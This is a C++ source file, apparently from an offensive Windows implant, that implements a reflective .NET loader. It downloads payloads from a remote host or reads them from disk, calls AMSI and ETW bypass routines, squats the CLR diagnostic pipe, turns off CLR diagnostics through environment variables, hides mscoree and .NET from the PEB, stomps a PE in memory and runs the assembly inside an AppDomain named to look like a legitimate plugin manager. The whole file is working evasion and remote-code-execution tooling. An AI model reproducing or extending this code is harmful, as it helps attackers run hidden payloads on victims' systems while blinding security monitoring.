#include "dotnet.hpp"
#pragma comment(lib, "mscoree.lib")
#undef GetMessage
#undef Yield
#undef MessageBox

#import <mscorlib.tlb> raw_interfaces_only \
    high_property_prefixes("_get","_put","_putref") \
    rename("ReportEvent", "ClrReportEvent") \
    rename("IAppDomain", "mscorlib_IAppDomain") \
    rename("IHashCodeProvider", "mscorlib_IHashCodeProvider") \
    rename("or", "mscorlib_or")  // <--- Add this line
using namespace mscorlib;

#include <shellapi.h>
#pragma comment(lib, "shell32.lib")

void InitDotnet(std::wstring FilePath, bool isRemote, std::wstring args, bool https, bool powershell) {
	if (isRemote) {
		std::cout << "[+] Remote dotnet execution\n";
		Dotnet(FilePath, args, true, https, powershell);
	}
	else {
		std::wcout << "Received argument for initialisation: filePath: " << FilePath << " args: " << args << "\n";
		if (checkFile(FilePath) || powershell) {
			std::cout << "[+] File is a valid .NET executable, proceeding with execution\n";
			Dotnet(FilePath, args, false, https, powershell);
		}
		else {
			std::cout << "[-] Could not parse file path or file does not exist, exiting\n";
			return;
		};

	}
};

bool checkFile(std::wstring filePath) {
	std::wcout << "[*] Checking if file is a valid file: " << filePath << "\n";
    if (filePath.find(L".ps1") != std::wstring::npos) {
        std::cout << "[+] File identified as a PowerShell script.\n";
        return true;
    }
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcout << "[-] Failed to open file: " << filePath << "\n";
        return false;
    };
    HANDLE hMapping = CreateFileMappingW(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!hMapping)
    {
        CloseHandle(hFile);
        return false;
    }

    LPVOID base = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!base)
    {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    bool result = false;

    try
    {
        
        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
            result = false; // Not a valid PE file

        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
            reinterpret_cast<BYTE*>(base) + dosHeader->e_lfanew);

        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
            result = false; // Not a valid PE file
        if (ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
            std::cout << "[!] Target file is x86 (32-bit)\n";
        }
        else if (ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
            std::cout << "[!] Target file is x64 (64-bit)\n";
        }
        // Check if there is a CLR (.NET) header
        const IMAGE_DATA_DIRECTORY& clrDir =
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];

        if (clrDir.VirtualAddress != 0 && clrDir.Size != 0)
        {
            result = true; // This is a .NET executable
        }
    }
    catch (...)
    {
        result = false; // Any parsing error means it's not a valid .NET PE
	}
    

    UnmapViewOfFile(base);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return result;
}

DWORD RvaToOffset(PIMAGE_NT_HEADERS ntHeaders, DWORD rva) {
    auto section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        if (rva >= section->VirtualAddress && rva < (section->VirtualAddress + section->Misc.VirtualSize)) {
            return (rva - section->VirtualAddress) + section->PointerToRawData;
        }
    }
    return 0;
}



std::wstring checkCLRVersion(LPCSTR assmblyBytes, size_t assemblyLength, LPCSTR byteSeq, size_t byteSeqLength) {
    for (size_t _index = 0; _index < assemblyLength; _index++) {
        if (byteSeq[0] == assmblyBytes[_index] && byteSeq[9] == assmblyBytes[_index + 9]
            && byteSeq[2] == assmblyBytes[_index + 2] && byteSeq[6] == assmblyBytes[_index + 6]) {
            return L"v4.0.30319";
        }
    }

    return L"v4.0.30319";
}


SAFEARRAY* setEntrypointParams(LPSTR* arguments, size_t argsCount) {
    VARIANT args;
    args.vt = VT_ARRAY | VT_BSTR;
    SAFEARRAYBOUND argsBound[1];
    argsBound[0].lLbound = 0;
    size_t argsLength = arguments != NULL ? argsCount : 0;
    argsBound[0].cElements = argsLength;
    args.parray = SafeArrayCreate(VT_BSTR, 1, argsBound);
    LONG idx[1];
    for (size_t i = 0; i < argsLength; i++) {
        idx[0] = i;
        SafeArrayPutElement(args.parray, idx, SysAllocString(_bstr_t(arguments[i]).Detach()));
    }
    SAFEARRAY* params = NULL;
    SAFEARRAYBOUND paramsBound[1];
    paramsBound[0].lLbound = 0;
    paramsBound[0].cElements = 1;
    params = SafeArrayCreate(VT_VARIANT, 1, paramsBound);
    idx[0] = 0;
    SafeArrayPutElement(params, idx, &args);

    

    return params;
}
const char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
const char v2[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };

LPSTR* convertArgsToLPSTRArray(std::wstring args, int& argsCount) {
    //converting args from wstring to LPSTR array
    
    LPWSTR* szArglist = CommandLineToArgvW(args.c_str(), &argsCount);

    

    // 2. Prepare the LPSTR* (char**) array
    LPSTR* arguments = new LPSTR[argsCount];

    for (int i = 0; i < argsCount; i++) {
        // Determine required buffer size for conversion
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, szArglist[i], -1, NULL, 0, NULL, NULL);

        // Allocate and convert
        arguments[i] = new char[size_needed];
        WideCharToMultiByte(CP_UTF8, 0, szArglist[i], -1, arguments[i], size_needed, NULL, NULL);
    }
    return arguments;
}


std::vector<char> fetchRemoteEx(std::wstring url, std::wstring file, bool https) {
    std::vector<unsigned char> data =
        helperHandler.fetchRemoteShellcodeAndDecode(url, file, 0x00, https);

    return std::vector<char>(data.begin(), data.end());
};

void PrepareStealthEnvironment() {
    // Disable the diagnostic pipe creation
    SetEnvironmentVariableW(L"COMPlus_EnableDiagnostics", L"0");

    // Disable ETW events for the CLR (hides assembly loads from ETW)
    //SetEnvironmentVariableW(L"COMPlus_ETWEnabled", L"0");

    // Optional: Prevent the CLR from writing to the UsageLogs folder
    SetEnvironmentVariableW(L"COMPlus_NoUsageLogs", L"1");
}
HANDLE BlockDiagnosticPipe() {
    DWORD pid = GetCurrentProcessId();

    // The format used by .NET Core / .NET 5+ for diagnostic pipes
    // For .NET Framework, it often uses 'DotNetDiagnostics-{PID}-a'
    wchar_t pipeName[MAX_PATH];
    swprintf_s(pipeName, L"\\\\.\\pipe\\DotNetDiagnostics-%d-a", pid);

    std::wcout << L"[*] Squatting on pipe: " << pipeName << std::endl;

    // Create the pipe with a dummy listener
    HANDLE hPipe = CreateNamedPipeW(
        pipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,          // Only 1 instance allowed
        1024, 1024, // Buffer sizes
        0,          // Timeout
        NULL        // Security attributes
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        std::cout << "[-] Failed to squat on pipe. Error: " << GetLastError() << std::endl;
        return NULL;
    }

    std::cout << "[+] Pipe squatted. CLR diagnostics blocked." << std::endl;
    return hPipe; // Keep this handle open for the life of the process
}
void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote, bool https, bool powershell) {
    int argsCount = 0;
    SAFEARRAY* params = nullptr;
    LPSTR* arguments = convertArgsToLPSTRArray(args, argsCount);

    // 1. Initial Bypasses and Setup
    
    if (!powershell) {
        FullAmsiBypass(powershell);
        }
    
    if (!FullEtwBypass()) {
        std::cout << "[-] Failed to bypass ETW, exiting early\n";
        return;
    }

    HANDLE blockingPip = BlockDiagnosticPipe();
    PrepareStealthEnvironment();
    std::wcout << L"------- Reflective .NET Loader -------\n";

    // 2. Locate CLR Instance from manually mapped mscoree
    HMODULE g_ManualMscoree = mainInjector.myLdrLoadDll(L"mscoree.dll");
    typedef HRESULT(WINAPI* f_CLRCreateInstance)(REFCLSID, REFIID, LPVOID*);
    auto pCLRCreateInstance = (f_CLRCreateInstance)syscallHandler.getFunctionAddressByHashWithModule(g_ManualMscoree, 3590936079);

    if (!pCLRCreateInstance) {
        std::cout << "[-] Could not find CLRCreateInstance export.\n";
        return;
    }

    // 3. File Acquisition
    std::vector<char> buffer;
    if (isRemote) {
        size_t pos = FilePath.find(L'/');
        if (pos != std::wstring::npos) {
            std::wstring url = FilePath.substr(0, pos);
            std::wstring path = FilePath.substr(pos);
            buffer = fetchRemoteEx(url, path, https);
        }
        else {
            std::wcout << "[-] Invalid remote path format.\n";
            return;
        }
    }
    else {
        std::ifstream file(FilePath, std::ios::binary | std::ios::ate);
        if (!file.is_open()) { std::cerr << "[-] Failed to open file.\n"; return; }
        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        buffer.resize(size);
        file.read(buffer.data(), size);
    }

    // 4. Version Detection & Runtime Initialization
    // Force v4 if powershell helper is used, else scan buffer
    std::wstring clrVersion = powershell ? L"v4.0.30319" : checkCLRVersion(buffer.data(), buffer.size(), v4, strlen(v4));
    std::wcout << "[*] Target .NET Version: " << clrVersion << std::endl;

    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    ICLRMetaHost* metaHost = nullptr;
    ICLRRuntimeInfo* runtimeInfo = nullptr;
    ICorRuntimeHost* runtimeHost = nullptr;
    _AssemblyPtr pAssembly = nullptr;
    _MethodInfoPtr pEntryPoint = nullptr;

    hr = pCLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost);
    hr = metaHost->GetRuntime(clrVersion.c_str(), IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo);
    helperHandler.UnlinkModuleFromPEB(L"mscoree.dll");
    hr = runtimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&runtimeHost);
    hr = runtimeHost->Start();

    // 5. Custom AppDomain Setup
    IUnknownPtr pSetupUnk = nullptr;
    IAppDomainSetupPtr pSetup = nullptr;
    IUnknownPtr pAppDomainUnk = nullptr;
    _AppDomainPtr pCustomAppDomain = nullptr;

    hr = runtimeHost->CreateDomainSetup(&pSetupUnk);
    if (SUCCEEDED(hr)) {
        pSetupUnk->QueryInterface(IID_PPV_ARGS(&pSetup));
        pSetup->put_ApplicationName(_bstr_t(L"Microsoft.Plugin.Manager"));
        pSetup->put_ApplicationBase(_bstr_t(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\"));
    }

    hr = runtimeHost->CreateDomainEx(_bstr_t(L"MgmtDomain"), pSetup, nullptr, &pAppDomainUnk);
    if (FAILED(hr)) { std::cout << "[-] CreateDomainEx failed: 0x" << std::hex << hr << "\n"; return; }
    hr = pAppDomainUnk->QueryInterface(IID_PPV_ARGS(&pCustomAppDomain));
    helperHandler.ClearDotNetFromPeb();

    // 6. Payload and Argument Preparation
    std::vector<char> assemblyBuffer;
    std::string scriptContent;
    std::vector<char>* activeBuffer = &buffer;

    if (powershell) {
        // Load the Runner EXE (The C# wrapper for PS)
        std::ifstream exeFile("Powershell.exe", std::ios::binary | std::ios::ate);
        if (!exeFile.is_open()) { std::cout << "[-] Powershell.exe runner not found locally.\n"; return; }
        std::streamsize exeSize = exeFile.tellg();
        exeFile.seekg(0, std::ios::beg);
        assemblyBuffer.resize(exeSize);
        exeFile.read(assemblyBuffer.data(), exeSize);
        activeBuffer = &assemblyBuffer;

        // Load the .ps1 script content
        std::ifstream psFile(FilePath);
        scriptContent.assign((std::istreambuf_iterator<char>(psFile)), std::istreambuf_iterator<char>());

        // args[0] = ScriptContent, args[1] = CmdArgs
        LPSTR* runnerArgs = new LPSTR[2];
        runnerArgs[0] = (LPSTR)scriptContent.c_str();
        runnerArgs[1] = (argsCount > 0) ? arguments[0] : (LPSTR)"";
        params = setEntrypointParams(runnerArgs, 2);
    }
    else {
        params = setEntrypointParams(arguments, argsCount);
    }

    // 7. SafeArray Mapping and Loading
    SAFEARRAYBOUND bounds = { (ULONG)activeBuffer->size(), 0 };
    SAFEARRAY* psa = SafeArrayCreate(VT_UI1, 1, &bounds);

    // Stomp the PE and get the pointer
    PVOID entryPointNetBytes = GetStompedAddress(HANDLE(-1), activeBuffer->data(), activeBuffer->size());
    std::cout << "[+] Assembly memory prepared at " << entryPointNetBytes << "\n";

    psa->pvData = entryPointNetBytes;
    psa->fFeatures |= FADF_STATIC;

    std::cout << "[*] Loading assembly into AppDomain...\n";
    hr = pCustomAppDomain->Load_3(psa, &pAssembly);

    if (FAILED(hr)) {
        std::cout << "[-] Load_3 failed. HRESULT: 0x" << std::hex << hr << "\n";
        goto cleanup;
    }

    hr = pAssembly->get_EntryPoint(&pEntryPoint);
    if (FAILED(hr) || pEntryPoint == nullptr) {
        std::cout << "[-] Could not find Entry Point.\n";
        goto cleanup;
    }

    // 8. Execution
    std::cout << "[+] Invoking Entry Point...\n";
    VARIANT varObj; VariantInit(&varObj); varObj.vt = VT_NULL;
    VARIANT retVal; VariantInit(&retVal);
    if (powershell) {
        FullAmsiBypass(powershell);
    }
    hr = pEntryPoint->Invoke_3(varObj, params, &retVal);

cleanup:
    if (psa) SafeArrayDestroy(psa);
    if (runtimeHost) {
        runtimeHost->UnloadDomain(pAppDomainUnk); // Clean up the domain
        runtimeHost->Release();
    }
    if (runtimeInfo) runtimeInfo->Release();
    if (metaHost) metaHost->Release();
    CoUninitialize();
}